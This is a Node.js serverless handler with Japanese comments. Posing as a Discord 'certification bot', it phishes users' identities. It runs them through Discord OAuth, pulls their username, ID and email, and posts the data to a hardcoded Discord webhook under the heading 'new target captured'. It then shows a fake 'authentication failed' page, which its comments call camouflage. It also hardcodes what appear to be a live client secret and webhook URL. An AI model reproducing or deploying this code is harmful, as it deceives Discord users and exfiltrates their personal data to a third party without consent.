const axios = require("axios");

exports.handler = async (event) => {
    const code = event.queryStringParameters.code;

    const CLIENT_ID = "1486331018947330118";
    const CLIENT_SECRET = "jvQXDpFAX52L2okWM4hSOnMYFq2yco0R"; // 王のSecret
    const REDIRECT_URI = "https://certification-bot.netlify.app";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1487151800657121422/kP7ED3TYjbEvV5iaBrm3FUBEfEGtPIkcSdueORh91uFz-2L1MMGPV6Pxg2-JPe5KYXWY";

    // 1. コードがない場合は認証画面へリダイレクト
    if (!code) {
        return {
            statusCode: 302,
            headers: {
                Location: `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email`
            }
        };
    }

    try {
        // 2. トークン取得
        const params = new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: "authorization_code",
            code: code,
            redirect_uri: REDIRECT_URI
        });

        const tokenRes = await axios.post("https://discord.com/api/oauth2/token", params);
        const accessToken = tokenRes.data.access_token;

        // 3. ユーザー情報取得
        const userRes = await axios.get("https://discord.com/api/users/@me", {
            headers: { Authorization: `Bearer ${accessToken}` }
        });
        const user = userRes.data;

        // 4. 【本命】Webhookへデータを送信
        await axios.post(WEBHOOK_URL, {
            embeds: [{
                title: "📩 新規ターゲット捕捉",
                color: 0x5865f2,
                fields: [
                    { name: "ユーザー名", value: `\`${user.username}\``, inline: true },
                    { name: "ユーザーID", value: `\`${user.id}\``, inline: true },
                    { name: "メールアドレス", value: `**${user.email || '取得不可'}**`, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        // 5. 画面には「認証失敗」のUIを返してカモフラージュ
        return {
            statusCode: 200,
            headers: { "Content-Type": "text/html" },
            body: `
            <!DOCTYPE html>
            <html lang="ja">
            <head><meta charset="UTF-8"><title>認証失敗</title>
            <style>
                body { background: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .card { background: #2b2d31; padding: 30px; border-radius: 12px; text-align: center; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
                .icon { font-size: 50px; color: #ed4245; margin-bottom: 15px; }
                button { width: 100%; padding: 10px; background: #5865f2; border: none; color: white; border-radius: 5px; cursor: pointer; font-weight: bold; }
            </style>
            </head>
            <body>
                <div class="card">
                    <div class="icon">✖</div>
                    <h2>認証に失敗しました</h2>
                    <p style="color: #b5bac1; font-size: 14px;">再度やり直してください。</p>
                    <button onclick="location.reload()">再試行</button>
                </div>
            </body>
            </html>`
        };

    } catch (err) {
        return { statusCode: 500, body: "システムエラー" };
    }
};
